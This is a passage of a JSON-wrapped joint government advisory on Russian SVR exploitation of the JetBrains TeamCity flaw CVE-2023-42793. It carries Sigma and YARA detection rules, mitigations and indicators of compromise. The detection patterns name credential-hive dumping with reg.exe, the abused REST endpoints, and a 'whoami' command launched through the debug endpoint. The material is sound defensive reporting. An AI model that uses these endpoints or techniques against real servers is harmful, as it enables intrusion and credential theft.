\\\\[Tt]{1}emp \\\\.*' \n    condition: selection  \n \n \ntitle: DLL names used by SVR for GraphicalProton  backdoor  \ndescription: Hunts for known SVR -specific DLL names.  \nreferences:  \nauthor:  \ndate: 2023 /11/15 \nlogsource:  \n    category: image_load  \n    product: windows  \ndetection:  \n    selection:  \n        ImageLoaded|endswith:  \n          - 'AclNumsInvertHost.dll'  \n          - 'ModeBitmapNumericAnimate.dll'  \n          - 'UnregisterAncestorAppendAuto.dll'  \n          - 'DeregisterSeekUsers.dll'  \n          - 'ScrollbarHandleGet.dll'  \n          - 'PerformanceCaptionApi.dll'  \n          - 'WowIcmpRemoveReg.dll'  \n          - 'BlendMonitorStringBuild.dll'  \n          - 'HandleFrequencyAll.dll'  \n          - 'HardSwapColor.dll'  \n          - 'LengthInMemoryActivate.dll'  \n          - 'ParametersNamesPopup.dll'  \n          - 'ModeFolderSignMove.dll'  \n          - 'ChildPaletteConnected.dll'  \n          - 'AddressResourcesSpec.dll'  \n    condition: selection  \n \n \ntitle: Sensitive registry entries save d to file  \ndescription: Sensitive registry entries saved to file  \nauthor:  \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n\n \n  International Partnership  \nPage 18 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR      category: process_creation  \n    product: windows  \ndetection:  \n    selection_base:  \n        Image|endswith:  \n          - 'reg.exe'  \n        CommandLine|contains: 'save'  \n        CommandLine|re: '.*HKLM \\\\SYSTEM.*|.*HKLM \\\\SECURITY.*|.*HKLM \\\\SAM.*' \n    selection_file:  \n      CommandLine|re: '.*sy \\.sa.*|.*sam \\.sa.*|.*se \\.sa.*' \n    condition: selection_base and selection_file  \n \n \n \ntitle: Scheduled tasks name s used by SVR for GraphicalProton  backdoor  \ndescription: Hunts for known SVR -specific scheduled task names  \nauthor:  \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n    category: taskscheduler  \n    product: windows  \ndetection:  \n    selection:  \n        EventID:  \n          - 4698 \n          - 4699 \n          - 4702 \n        TaskName:  \n          - '\\Microsoft \\Windows\\IISUpdateService'  \n          - '\\Microsoft \\Windows\\WindowsDefenderService'  \n          - '\\Microsoft \\Windows\\WindowsDefenderService2'  \n          - '\\Microsoft \\Defender Service'  \n          - '\\Microsoft \\Windows\\DefenderUPDService'  \n          - '\\Microsoft \\Windows\\WiMSDFS'  \n          - '\\Microsoft \\Windows\\Application Experience \\StartupAppTaskCkeck'  \n          - '\\Microsoft \\Windows\\Windows Error Reporting \\SubmitReporting'  \n          - '\\Microsoft \\Windows\\Windows Defender \\Defender Update Service'  \n          - '\\WindowUpdate'  \n          - '\\Microsoft \\Windows\\Windows Error Reporting \\CheckReporting'  \n          - '\\Microsoft \\Windows\\Application Experience \\StartupAppTaskCheck'  \n          - '\\Microsoft \\Windows\\Speech\\SpeechModelInstallTask'  \n          - '\\Microsoft \\Windows\\Windows Filtering Platform \\BfeOnServiceStart'  \n          - '\\Microsoft \\Windows\\Data Integrity Scan \\Data Integrity Update'  \n          - '\\Microsoft \\Windows\\WindowsUpdate \\Scheduled AutoCheck'  \n          - '\\Microsoft \\Windows\\ATPUpd' \n          - '\\Microsoft \\Windows\\Windows Defender \\Service Update'  \n          - '\\Microsoft \\Windows\\WindowsUpdate \\Scheduled Check'  \n          - '\\Microsoft \\Windows\\WindowsUpdate \\Scheduled AutoCheck'  \n          - '\\Defender'  \n          - '\\defender'  \n          - '\\\\Microsoft \\\\Windows\\\\IISUpdateService'  \n          - '\\\\Microsoft \\\\Windows\\\\WindowsDefenderService'  \n\n \n  International Partnership  \nPage 19 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR            - '\\\\Microsoft \\\\Windows\\\\WindowsDefenderService2'  \n          - '\\\\Microsoft \\\\DefenderService ' \n          - '\\\\Microsoft \\\\Windows\\\\DefenderUPDService'  \n          - '\\\\Microsoft \\\\Windows\\\\WiMSDFS'  \n          - '\\\\Microsoft \\\\Windows\\\\Application Experience \\\\StartupAppTaskCkeck'  \n          - '\\\\Microsoft \\\\Windows\\\\Windows Error Reporting \\\\SubmitReporting ' \n          - '\\\\Microsoft \\\\Windows\\\\Windows Defender \\\\Defender Update Service'  \n          - '\\\\WindowUpdate'  \n          - '\\\\Microsoft \\\\Windows\\\\Windows Error Reporting \\\\CheckReporting'  \n          - '\\\\Microsoft \\\\Windows\\\\Application Experience \\\\StartupAppTa skCheck'  \n          - '\\\\Microsoft \\\\Windows\\\\Speech\\\\SpeechModelInstallTask'  \n          - '\\\\Microsoft \\\\Windows\\\\Windows Filtering Platform \\\\BfeOnServiceStart'  \n          - '\\\\Microsoft \\\\Windows\\\\Data Integrity Scan \\Data Integrity Update'  \n          - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate \\\\Scheduled AutoCheck'  \n          - '\\\\Microsoft \\\\Windows\\\\ATPUpd' \n          - '\\\\Microsoft \\\\Windows\\\\Windows Defender \\\\Service Update'  \n          - '\\\\Microsoft \\\\Windows\\\\WindowsUpdate \\\\Scheduled Check'  \n          - '\\\\Microsoft \\\\Windows\\\\WindowsUpdate \\\\Scheduled AutoCheck'  \n          - '\\\\Defender'  \n          - '\\\\defender'  \n    condition: selection  \n \n \ntitle: Scheduled tasks names used by SVR for GraphicalProton backdoor  \ndescription: Hunts for known SVR -specific scheduled task names  \nauthor:  \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n    category: process_creation  \n    product: windows  \ndetection:  \n    selection:  \n        Image|endswith:  \n          - 'schtasks.exe'  \n        CommandLine|contains:  \n          - 'IISUpdateService'  \n          - 'WindowsDefenderService'  \n          - 'WindowsDefenderService2'  \n          - 'DefenderService'  \n          - 'DefenderUPDService'  \n          - 'WiMSDFS'  \n          - 'StartupAppTaskCkeck'  \n          - 'SubmitReporting'  \n          - 'Defender Update Service'  \n          - 'WindowUpdate'  \n          - 'CheckReporting'  \n          - 'StartupAppTaskCheck'  \n          - 'SpeechModelInstallTask'  \n          - 'BfeOnServiceStart'  \n          - 'Data Integrity Update'  \n          - 'Scheduled AutoCheck'  \n          - 'ATPUpd'  \n\n \n  International Partnership  \nPage 20 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR            - 'Service Update'  \n          - 'Scheduled Check'  \n          - 'Scheduled AutoCheck'  \n          - 'Defender'  \n          - 'defender'  \n    selection_re:  \n        Image|endswith:  \n          - 'schtasks.exe'  \n        CommandLine|re:  \n          - '.*Defender \\sUpdate\\sService.* ' \n          - '.*Data\\sIntegrity \\sUpdate.*'  \n          - '.*Scheduled \\sAutoCheck.*'  \n          - '.*Service \\sUpdate.*'  \n          - '.*Scheduled \\sCheck.*'  \n          - '.*Scheduled \\sAutoCheck.*'  \n    condition: selection or selection_re  \n \n \n \ntitle: Suspicious reg istry modifications  \ndescription: Suspicious registry modifications  \nauthor:  \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n    category: registry_set  \n    product: windows  \ndetection:  \n    selection:  \n        EventID: 4657  \n        TargetObject|contains:  \n          - 'CurrentControlSet \\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'  \n          - 'CurrentControlSet \\\\Control\\\\Lsa\\\\NoLMHash' \n    condition: selection  \n \n \n \n \ntitle: Registry modification from cmd  \ndescription: Registry modification from cmd  \nauthor:  \nreferences:  \ndate: 2023/ 11/15 \nlogsource:  \n    category: process_creation  \n    product: windows  \ndetection:  \n    selection:  \n        Image|endswith:  \n          - 'reg.exe'  \n        CommandLine|contains|all:  \n          - 'CurrentControlSet'  \n          - 'Lsa' \n\n \n  International Partnership  \nPage 21 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR          CommandLine|contains:  \n          - 'DisableRestrictedAdmin'  \n          - 'NoLMHash' \n    condition: selection  \n \n \n \ntitle: Malicious Driver Load  \ndescription: Detects the load of known malicious drivers via their names or hash.  \nreferences:  \n    - https://github.com/wavestone -cdt/EDRSand blast#edr -drivers-and-processes -detection  \nauthor:  \ndate: 2023/11/15  \nlogsource:  \n    category: driver_load  \n    product: windows  \ndetection:  \n    selection_name:  \n        ImageLoaded|endswith:  \n            - 'RTCore64.sys'  \n            - 'DBUtils_2_3.sys'  \n    selection_hash:  \n        Hashes|contains:  \n            - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'  \n            - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'  \n    condition: selection_name or selection_hash  \nYARA rule s \nThe f ollowing rule detects most known GraphicalProton  variants . \nrule APT29_ GraphicalProton  { \n    strings:  \n        // C1 E9 1B                                shr     ecx, 1Bh  \n        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]  \n        // 8B 50 04                                mov     edx, [rax+4]  \n        // C1 E2 05                                shl     edx, 5  \n        // 09 D1                                   or      ecx, edx  \n        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]  \n        $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | \n08 | 10 | 0d | 07) 09 ?? 48 }  \n \n        // 48 05 20 00 00 00                       add     rax, 20h ; ' '  \n        // 48 89 C1                                mov     rcx, rax  \n        // 48 8D 15 0A A6 0D 00                    lea     rdx, unk_14011E546  \n        // 41 B8 30 00 00 00                       mov     r8d, 30h ; '0'  \n        // E8 69 B5 FE FF                          call    sub_1 4002F4B0  \n        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]  \n        // 48 05 40 00 00 00                       add     rax, 40h ; '@'  \n        // 48 89 C1                                mov     rcx, rax  \n        // 48 8D 15 1B A 6 0D 00                    lea     rdx, unk_14011E577  \n        // 41 B8 70 01 00 00                       mov     r8d, 170h  \n        // E8 49 B5 FE FF                          call    sub_14002F4B0  \n        // 48 8B 44 24 30                          mov     r ax, [rsp+88h+var_58]  \n\n \n  International Partnership  \nPage 22 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR          // 48 05 60 00 00 00                       add     rax, 60h ; '`'  \n        // 48 89 C1                                mov     rcx, rax  \n        // 48 8D 15 6C A7 0D 00                    lea     rdx, unk_14011E6E8  \n        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'  \n        // E8 29 B5 FE FF                          call    sub_14002F4B0  \n        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]  \n        // 48 05 80 00 00 00                       add     rax, 80h  \n        // 48 89 C1                                mov     rcx, rax  \n        // 48 8D 15 7C A7 0D 00                    lea     rdx, unk_14011E718  \n        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'  \n        // E8 09 B5 FE FF                          call    sub_14002F4B0  \n        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]  \n        // 48 05 A0 00 00 00                       add     rax, 0A0h  \n        $op_decrypt_config = {  \n            48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]  \n            48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]  \n            48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]  \n            48 05 80 00 00 00 48 89  C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]  \n            48 05 A0 00 00 00  \n        } \n \n    condition:  \n        all of them  \n} \nNote: These rules are meant for threat hunting and have not been tested on a larger dataset.  \nMITIGATION S \nThe FBI, CISA, NSA, SKW, CERT Polska , and NCSC  assess the scope and indiscriminate targeting of \nthis campaign poses a threat to public safety and recommend organizations implement the mitigations \nbelow to improve organizations cybersecurity posture. These mitigations align with the Cr oss-Sector \nCybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards \nand Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and \nNIST recommend all organizations implement. CISA an d NIST based the CPGs on existing \ncybersecurity frameworks and guidance to protect against the most common and impactful threats, \ntactics, techniques, and procedures. Visit CISAs Cross -Sector Cybersecurity Performance Goals  for \nmore information on the CPGs, including additional recommended baseline protections.  \n Apply available patches for CVE -2023 -42793 issued by JetBrains TeamCity in mid -\nSeptember 2023, if not already comple ted. \n Monitor the network  for evidence of encoded commands and execution of network scanning \ntools.  \n Ensure host -based anti -virus/endpoint monitoring solutions are enabled  and set to alert if \nmonitoring or reporting is disabled, or if communication is lost w ith a host agent for more than a \nreasonable amount of time.  \n Require use of multi -factor authentication  [CPG 1.3 ] for all services to the extent possible, \nparticularly for email, virt ual private networks, and accounts that access critical systems.  \n\n \n  International Partnership  \nPage 23 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR   Organizations should adopt multi -factor authentication (MFA) as an additional layer of \nsecurity for all users with access to sensitive data. Enabling MFA significantly reduces the \nrisk of una uthorized access, even if passwords are compromised.  \n Keep all operating systems, software, and firmware up to date. Immediately configure \nnewly -added systems to the network, including those used for testing or development work, to \nfollow the organizations  security baseline and incorporate into enterprise monitoring tools.  \n Audit log files  to identify attempts to access privileged certificates and creation of fake identity \nproviders.  \n Deploy software to identify suspicious behavior on systems.  \n Deploy endpoint  protection systems  with the ability to monitor for behavioral indicators of \ncompromise.  \n Use available public resources to identify credential abuse with cloud environments.  \n Configure authentication mechanisms  to confirm certain user activities on systems,  including \nregistering new devices.  \nVALIDATE SECURITY CO NTROLS  \nIn addition to applying mitigations, FBI, CISA, NSA, SKW , CERT Polska , and NCSC  recommend \nexercising, testing, and validating your organization's security program against the threat behaviors \nmapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW,  \nCERT Polska , and NCSC  recommend testing your existing security controls inventory to assess how \nthey perform against the ATT&CK techniques described in this advisory.  \nTo get started:  \n1. Select an ATT&CK technique described in this advisory (see previous tables ). \n2. Align your security technologies against the technique.  \n3. Test your technologies against the technique.  \n4. Analyze your detection and prevention technologies  performa nce. \n5. Repeat the process for all security technologies to obtain a set of comprehensive performance \ndata.  \n6. Tune your security program, including people, processes, and technologies, based on the \ndata generated by this process.  \nFBI, CISA, NSA, SKW, CERT Polsk a, and NCSC  recommend continually testing your security \nprogram, at scale, in a production environment to ensure optimal performance against the MITRE \nATT&CK techniques identified in this advisory.  \nREFERENCES  \n FBI, DHS, CISA, Joint Cyber Security Advisory, Russian Foreign Intelligence Service (SVR) \nCyber Operations: Trends and Best Practices for Network Defenders  \n NSA, CISA, FBI, Joint Cyber Security Advisory , Russian SVR Targets U.S. and Allied \nNetworks  \n CISA, Remediating Networks Affected by the Solarwinds and Active Directory/M365 \nCompromise  \n\n \n  International Partnership  \nPage 24 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR   CISA, Alert (AA21 -008A), Detecting Post -Compromise Threat Activ ity in Microsoft Cloud \nEnvironments  \n CISA, Alert (AA20 -352A), Advanced Persistent Threat Compromise of Government Agencies, \nCritical Infrastructure, and Private Sector Organ izations  \n CISA, CISA Insights, What Every Leader Needs  to Know About the Ongoing APT Cyber \nActivity  \n FBI, CISA, Joint Cybersecurity Advisory, Advanced Persistent Threat Actors Targeting U.S. \nThink Tanks  \n CISA, Malicious Activity Targeting COVID -19 Research, Vaccine Development  \n NCSC, CSE, NSA, CISA, Advisory: APT 29 Targets COVID -19 Vaccine Development  \nThe information in this report is being provided as is for informational purposes only. FBI, CISA, \nNSA, SKW, CERT Polska , and NCSC  do not endorse any commercial entity, product, company, or \nservice, including any entities, products, or services linked within this document. Any reference to \nspecific commercial entities, products, processes, or services by service mark, trademark, \nmanufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring \nby FBI, CISA, NSA, SKW, CERT Polska , and NCSC . \nVERSION HISTORY  \nDecember  13, 2023 : Initial version.  \n  \n\n \n  International Partnership  \nPage 25 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  APPENDIX A  INDICAT ORS OF COMPROMISE CV E-2023 -42793  \nOn a Windows system, the log file C:\\TeamCity \\logs\\teamcity -server.log will contain a log \nmessage when an attacker modified the internal. properties  file. There will also be a log message \nfor every process created via the /app/rest/debug/ processes  endpoint. In addition to showing the \ncommand line used, the user ID of the user account whose authentication token was used during the \nattack is also shown. For example:  \n[2023-09-26 11:53:46,970]   INFO - ntrollers.FileBrowseControl ler - File \nedited: C: \\ProgramData \\JetBrains \\TeamCity \\config\\internal.properties by \nuser with id=1  \n[2023-09-26 11:53:46,970]   INFO - s.buildServer.ACTIVITIES.AUDIT - \nserver_file_change: File \nC:\\ProgramData \\JetBrains \\TeamCity \\config\\internal.properties was modified \nby \"user with id=1\"  \n[2023-09-26 11:53:58,227]   INFO - tbrains.buildServer.ACTIVITIES - \nExternal process is launched by user user with id=1. Command line: cmd.exe \n\"/c whoami\"  \nAn attacker may attempt to cover their tracks by wiping this log file. I t does not appear that TeamCity \nlogs individual HTTP requests, but if TeamCity is configured to sit behind a HTTP proxy , the HTTP \nproxy may have suitable logs showing the  following target endpoints being accessed:  \n /app/rest/users/id:1/tokens/ RPC2  This endpoint is required to exploit the vulnerability.  \n /app/rest/ users   This endpoint is only required if the attacker wishes to create an arbitrary \nuser. \n /app/rest/debug/ processes   This endpoint is only required if the attacker wishes to create \nan arbitrary process.  \nNote:  The user ID value may be higher than 1.  \n  \n\n \n  International Partnership  \nPage 26 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  APPENDIX B  IOCS \nFile IoCs  \nGraphicalProton  backdoor:  \n 01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C024 0732  \n 34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E  \n 620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869  \n 773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13  \n 7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D993 14EA6C53  \n 8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7  \n 971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC  \n CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF  \n CD3584D61C2724F927553770924149BB51811742A461146B15B3 4A26C92CAD43  \n EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E  \n F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB  \n C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4  \n 4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B 14822131D43A6166  \nGraphicalProton HTTPS backdoor:  \n 18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93  \n 19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641  \n 1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8  \n 219FB90D2E88 A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67  \n 92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6  \n B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7  \n C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD  \n C40A8006 A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0  \n C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3  \n F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69  \nBackdoored vcperf : \n D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2 FA510E10600443  \nBackdoored Zabbix installation archive:  \n 4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F  \nBackdoored Webroot AV installation archive:  \n 950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4  \nModified rsockstun  \n CB83E5CB 264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF  \n \nNetwork IoCs  \n\n \n  International Partnership  \nPage 27 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR   \nTunnel Endpoints  \n 65.20.97 [.]203 \n 65.21.51 [.]58 \nExploitation Server  \n 103.76.128 [.]34 \nGraphicalProton HTTPS C2 URL:  \nhxxps://matclick[.]com/wp -query[.]php  \n\n",
  "cves": [],
  "techniques": [
    "T1027.001",
    "T1590.004",
    "T1574.002",
    "T1562.001",
    "T1003.002",
    "T1003.001",
    "T1564.001",
    "T1053.005",
    "T1558.001",
    "T1505.001",
    "T1059.001",
    "T1555.003",
    "T1592.002",
    "T1059.003"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "jcsa-svr-exploit-jetbrains-teamcity-cve",
  "source": "nsa",
  "id": "129d989d7f5234535277542a3a89279e7a9748a139292216d06b127e1689d105"
}